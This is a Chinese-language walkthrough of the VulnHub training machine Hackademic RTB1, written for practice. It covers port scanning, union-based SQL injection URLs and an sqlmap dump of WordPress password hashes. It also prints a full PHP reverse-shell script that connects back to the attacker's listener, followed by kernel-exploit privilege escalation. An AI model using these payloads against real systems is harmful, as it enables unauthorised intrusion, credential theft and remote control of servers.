# 靶机信息
hackadmic-RTB1是vulnhub平台发布的一个难度初级的渗透测试靶机
# 初始信息收集
## 靶机端口扫描
tcp端口扫描
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/hackadmic_rTB1]
└─$ sudo nmap -sT -p- --min-rate 10000 192.168.218.190 -oA ./nmapScan/default
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 08:23 EDT
Nmap scan report for 192.168.218.190
Host is up (0.00040s latency).
Not shown: 65520 filtered tcp ports (no-response), 13 filtered tcp ports (host-unreach)
PORT   STATE  SERVICE
22/tcp closed ssh
80/tcp open   http
MAC Address: 00:0C:29:01:8A:4D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds

```
udp端口扫描
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/hackadmic_rTB1]
└─$ sudo nmap -sU -p- --min-rate 10000 192.168.218.190 -oA nmapScan/udpPort 
[sudo] kali 的密码：
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 08:23 EDT
Warning: 192.168.218.190 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.218.190
Host is up (0.00087s latency).
All 65535 scanned ports on 192.168.218.190 are in ignored states.
Not shown: 65470 open|filtered udp ports (no-response), 65 filtered udp ports (host-prohibited)
MAC Address: 00:0C:29:01:8A:4D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 72.91 seconds

```

详细端口服务扫描
```
┌──(kali㉿kali)-[~/…/writeup/vulnhub/hackadmic_rTB1/nmapScan]
└─$ cat detail.nmap 
# Nmap 7.95 scan initiated Tue Jul 22 08:31:51 2025 as: /usr/lib/nmap/nmap -sCV -p22,80 -O -oA nmapScan/detail 192.168.218.190
Nmap scan report for 192.168.218.190
Host is up (0.00032s latency).

PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
|_http-server-header: Apache/2.2.15 (Fedora)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Hackademic.RTB1  
MAC Address: 00:0C:29:01:8A:4D (VMware)
Device type: general purpose|media device|router|webcam|WAP
Running (JUST GUESSING): Linux 2.6.X|3.X|5.X (98%), LG embedded (92%), MikroTik RouterOS 7.X (91%), Tandberg embedded (91%), Infomir embedded (91%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5.10 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/h:infomir:mag-250 cpe:/o:linux:linux_kernel:2.6.32
Aggressive OS guesses: Linux 2.6.22 - 2.6.36 (98%), Linux 2.6.23 - 2.6.38 (94%), Linux 2.6.31 - 2.6.35 (94%), Linux 2.6.32 - 2.6.39 (93%), LG Bp430 Blu-ray Player (92%), Linux 2.6.32 (92%), Linux 2.6.22 (92%), Linux 2.6.32 - 3.13 (91%), OpenWrt 22.03 (Linux 5.10) (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 22 08:32:06 2025 -- 1 IP address (1 host up) scanned in 15.01 seconds

```
同时可以使用漏洞脚本扫描一下
```
┌──(kali㉿kali)-[~/…/writeup/vulnhub/hackadmic_rTB1/nmapScan]                                                                                                                 08:35:21 [4/82]
└─$ sudo nmap -sC --script=vuln -p22,80 192.168.218.190 -oA vuln                                                                                                                             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 08:32 EDT                                                                                                                              
Nmap scan report for 192.168.218.190                                                                                                                                                         
Host is up (0.00025s latency).                                                                                                                                                               

PORT   STATE  SERVICE                                                                         
22/tcp closed ssh                                                                             
80/tcp open   http                                                                            
| http-slowloris-check:                                                                       
|   VULNERABLE:                                                                               
|   Slowloris DOS attack                                                                      
|     State: LIKELY VULNERABLE                                                                
|     IDs:  CVE:CVE-2007-6750                                                                 
|       Slowloris tries to keep many connections to the target web server open and hold                                                                                                      
|       them open as long as possible.  It accomplishes this by opening connections to                                                                                                       
|       the target web server and sending a partial request. By doing so, it starves                                                                                                         
|       the http server's resources causing Denial Of Service.                                                                                                                               
|                                                                                             
|     Disclosure date: 2009-09-17                                                             
|     References:                                                                             
|       http://ha.ckers.org/slowloris/                                                        
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750                                                                                                                         
|_http-dombased-xss: Couldn't find any DOM based XSS.                                                                                                                                        
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                                                                                                             
|_http-csrf: Couldn't find any CSRF vulnerabilities.                                                                                                                                         
|_http-trace: TRACE is enabled                                                                
| http-vuln-cve2011-3192:                                                                     
|   VULNERABLE:                                                                               
|   Apache byterange filter DoS                                                               
|     State: VULNERABLE                                                                       
|     IDs:  BID:49303  CVE:CVE-2011-3192                                                      
|       The Apache web server is vulnerable to a denial of service attack when numerous                                                                                                      
|       overlapping byte ranges are requested.                                                
|     Disclosure date: 2011-08-19                                                             
|     References:                                                                             
|       https://www.tenable.com/plugins/nessus/55976                                                                                                                                         
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192                                                                                                                         
|       https://seclists.org/fulldisclosure/2011/Aug/175                                                                                                                                     
|_      https://www.securityfocus.com/bid/49303                                               
| http-enum:                                                                                  
|_  /icons/: Potentially interesting folder w/ directory listing                                                                                                                             
MAC Address: 00:0C:29:01:8A:4D (VMware)                                                       

Nmap done: 1 IP address (1 host up) scanned in 146.21 seconds  
```
借本扫描结束，只扫描到两个端口，ssh是close状态，漏洞脚本扫描都是dos攻击，没什么用，开始手工枚举信息。

## web信息枚举
访问80端口，是一个挑战，获取 key.txt，给了明确的目标，应该不用扫描目录，算了还是挂个后台扫一下，果然啥也没扫到。

查看源码，源码最后一行有几个参数
```<p>&#8212;NickJames | <a href="/Hackademic_RTB1/?p=9#comments">no comments</a> <br /><small>(posted in <a href="/Hackademic_RTB1/?cat=1" title="View all posts in Uncategorized" rel="category tag">Uncategorized</a>```
尝试更改 **cat** 和 **p** 参数的值，直到更换 **cat** 后面的值，页面发生改变，出现了 search 框，看来是**sql注入**
初学者，就手工爆了。
<img width="1919" height="1035" alt="Image" src="https://github.com/user-attachments/assets/98fea2b1-516e-4400-b6ed-49ccfe6d2d90" />

输入单引号报错显示，有对符号的转义
```WordPress database error: [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\\' LIMIT 1' at line 1]
SELECT * FROM wp_categories WHERE cat_ID = \\\' LIMIT 1
```

加的 **/** 转义，试试是不是宽字节注入，不行。后面又试别的，发现压根就没有符号闭合。

<img width="1919" height="1037" alt="Image" src="https://github.com/user-attachments/assets/df2121fd-e541-4553-b1c9-d6965289e7dc" />

还是一步一步走，先判断表的列数，使用 **group by** 发现 6 报错，5 没有报错。
`http://192.168.218.190/Hackademic_RTB1/?cat=1%20group%20by%205`
使用联合注入，发现第二位回显。
`http://192.168.218.190/Hackademic_RTB1/?cat=0%20union%20select%201,database(),3,4,5#`

<img width="1919" height="1039" alt="Image" src="https://github.com/user-attachments/assets/96b726eb-b83a-4062-94e8-d4da58eb3869" />

一库 指的是 information_schema 数据库。这个数据库是 MySQL 的核心库，包含了所有数据库的元数据。它存储了关于数据库、表和字段的详细信息。

三表 是指 information_schema 数据库中的三个关键表：
1. schemata 表：存放所有数据库的信息。
2. tables 表：存放所有表的信息。
3. columns 表：存放所有字段的信息。

六字段 是指上述三表中的六个关键字段：
1. schemata 表的 schema_name 字段：存放具体的数据库名。
2. tables 表的 table_name 字段：存放具体的表名。
3. tables 表的 table_schema 字段：存放表所在的数据库名。
4. columns 表的 column_name 字段：存放具体的字段名。
5. columns 表的 table_name 字段：存放字段所在的表名。
6. columns 表的 table_schema 字段：存放字段所在的数据库名。

爆表的时候，引号会被 **///** 过滤，有点麻烦，直接sqlmap梭哈了

`└─$ sudo sqlmap http://192.168.218.190/Hackademic_RTB1/?cat=1 --batch -D wordpress --tables --dump -o`

拿到 wp_user 和 password 再扫描一下后台目录
```
┌──(kali㉿kali)-[~/…/hackadmic_rTB1/sqlmap/Key/192.168.218.190]
└─$ gobuster dir -u http://192.168.218.190/Hackademic_RTB1/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,html,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.218.190/Hackademic_RTB1/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 339] [--> http://192.168.218.190/Hackademic_RTB1/wp-content/]
/wp-admin             (Status: 301) [Size: 337] [--> http://192.168.218.190/Hackademic_RTB1/wp-admin/]
/wp-includes          (Status: 301) [Size: 340] [--> http://192.168.218.190/Hackademic_RTB1/wp-includes/]
/xmlrpc.php           (Status: 200) [Size: 42]
/index.php            (Status: 500) [Size: 1881]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp.php               (Status: 200) [Size: 1694]
/wp-feed.php          (Status: 200) [Size: 1607]
/wp-images            (Status: 301) [Size: 338] [--> http://192.168.218.190/Hackademic_RTB1/wp-images/]
/wp-login.php         (Status: 200) [Size: 1474]
/readme.html          (Status: 200) [Size: 8783]
/license.txt          (Status: 200) [Size: 15127]
/wp-register.php      (Status: 200) [Size: 1437]
/wp-config.php        (Status: 200) [Size: 0]
/index.php            (Status: 500) [Size: 1881]
Progress: 224656 / 224660 (100.00%)
===============================================================
Finished
===============================================================

```
找一个带登录功能的页面wp-login.php，搜索cms指纹信息，看看有什么别的漏洞，但是都是sql输入漏洞已经利用过了，但是不小心搜到靶场复现了，有个文件上传字样，那么就开始找上传的位置了
看之前使用sqlmap跑出来的wp_users表中的用户登录试一下,感觉admin密码权限高一点，试第一个NickJames:admin成功登录进来，只有一下简单的功能，也没有尝试出来什么利用点，再试试其他的用户。第二个密码没有跑出来试第三个 GeorgeMiller:q1w2e3
```
Database: wordpress                                                                                                                                                                                                                                                          
Table: wp_users
[6 entries]
+----+---------+----------+----------+----------+----------+----------+---------------------------------------------+-------------------------+------------+--------------+-------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+
| ID | user_ip | user_aim | user_icq | user_msn | user_url | user_yim | user_pass                                   | user_email              | user_level | user_login   | user_domain | user_idmode | user_status | user_browser | user_lastname | user_nicename | user_nickname | user_firstname | user_registered     | user_description | user_activation_key |
+----+---------+----------+----------+----------+----------+----------+---------------------------------------------+-------------------------+------------+--------------+-------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+
| 1  | <blank> | <blank>  | 0        | <blank>  | http://  | <blank>  | 21232f297a57a5a743894a0e4a801fc3 (admin)    | NickJames@hacked.com    | 1          | NickJames    | <blank>     | login       | 0           | <blank>      | James         | nickjames     | NickJames     | Nick           | 2010-10-25 20:40:23 | <blank>          | <blank>             |
| 2  | <blank> | <blank>  | 0        | <blank>  | http://  | <blank>  | b986448f0bb9e5e124ca91d3d650f52c            | JohnSmith@hacked        | 0          | JohnSmith    | <blank>     | login       | 0           | <blank>      | Smith         | johnsmith     | JohnSmith     | John           | 2010-10-25 21:25:22 | <blank>          | <blank>             |
| 3  | <blank> | <blank>  | 0        | <blank>  | http://  | <blank>  | 7cbb3252ba6b7e9c422fac5334d22054 (q1w2e3)   | GeorgeMiller@hacked.com | 10         | GeorgeMiller | <blank>     | nickname    | 0           | <blank>      | Miller        | georgemiller  | GeorgeMiller  | George         | 2011-01-07 03:08:51 | <blank>          | <blank>             |
| 4  | <blank> | <blank>  | 0        | <blank>  | http://  | <blank>  | a6e514f9486b83cb53d8d932f9a04292 (napoleon) | TonyBlack@hacked.com    | 0          | TonyBlack    | <blank>     | nickname    | 0           | <blank>      | Black         | tonyblack     | TonyBlack     | Tony           | 2011-01-07 03:09:55 | <blank>          | <blank>             |
| 5  | <blank> | <blank>  | 0        | <blank>  | http://  | <blank>  | 8601f6e1028a8e8a966f6c33fcd9aec4 (maxwell)  | JasonKonnors@hacked.com | 0          | JasonKonnors | <blank>     | nickname    | 0           | <blank>      | Konnors       | jasonkonnors  | JasonKonnors  | Jason          | 2011-01-07 03:10:36 | <blank>          | <blank>             |
| 6  | <blank> | <blank>  | 0        | <blank>  | http://  | <blank>  | 50484c19f1afdaf3841a0d821ed393d2 (kernel)   | MaxBucky@hacked.com     | 0          | MaxBucky     | <blank>     | nickname    | 0           | <blank>      | Bucky         | maxbucky      | MaxBucky      | Max            | 2011-01-07 03:11:18 | <blank>          | <blank>             |
+----+---------+----------+----------+----------+----------+----------+---------------------------------------------+-------------------------+------------+--------------+-------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+

```
GeorgeMiller登录上去，功能比较多，在这里发现了上传的地方。但是无法上传webshell

<img width="1919" height="1035" alt="Image" src="https://github.com/user-attachments/assets/42cd38ce-ffa0-4d56-8bec-72e3d8a39f60" />

在这里发现添加允许 php 文件上传

<img width="1918" height="1034" alt="Image" src="https://github.com/user-attachments/assets/e2908153-3c01-4d9c-8a80-bf29809da4ee" />
上传webshell
但后在upload上传shell文件，很奇怪说我上传的文件以存在，难道是上面 link  上传虽然有报错但是还是成功上传了吗。后面登录上去之后发现之前上的 shell.php 也在，说明前面虽然报错了，但是任然上传成功了。

<img width="1912" height="1031" alt="Image" src="https://github.com/user-attachments/assets/0c0478c5-e01c-4e66-96cf-aba9bf3c0493" />

我是上传的反弹shell
```
<?php
$ip = '192.168.218.148';  
$port = 4444;             
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', 
    array(0 => $sock, 1 => $sock, 2 => $sock), 
    $pipes);
?>
```
在kali上 **nc -lvnp 4444** 设置监听，然后访问  **ip/Hackademic_RTB1/wp-content/rev_01.php** 反弹shell

<img width="1917" height="94" alt="Image" src="https://github.com/user-attachments/assets/3b4a9efc-af05-4443-bc0f-6227f9855116" />

 python升级shell然后开始提权
`python -c 'import pty;pty.spawn("/bin/bash")'`

翻了很半天也没翻到什么有用的信息，就知道还有一个p0wnbox.team用户，那就上传linpeas扫描一下，发现有可能有 **dirtycow** 漏洞利用，试了一下exp，不行，在uname找一下有没有版本漏洞，又找到很多， 都试一下，试了很久都没成功，几乎所有的exp都试过了还是没有用，后面掉兔子洞了，又回去研究p0wnbox.team用户，卡了很久也没办法，看了wp。
需要使用下面的第二个exp，并且还需要扒到靶机上编译执行，不然会报错。
<img width="1919" height="97" alt="Image" src="https://github.com/user-attachments/assets/e6510aa2-9981-40cb-8c54-68f11ca48384" />

<img width="1919" height="584" alt="Image" src="https://github.com/user-attachments/assets/0d248cdf-505e-4948-909e-9ba5ae386aea" />

## 反思
这一台靶机前面拿shell的过程那可以一环套一环，一直有路子走，但是后面提权的部分，寻找exp的能力还是不行，导致被卡了很久，还需要着重练习一下提权姿势。这一台靶机也是非常接近实战，几乎是没有什么提示的，是很好的一台靶机。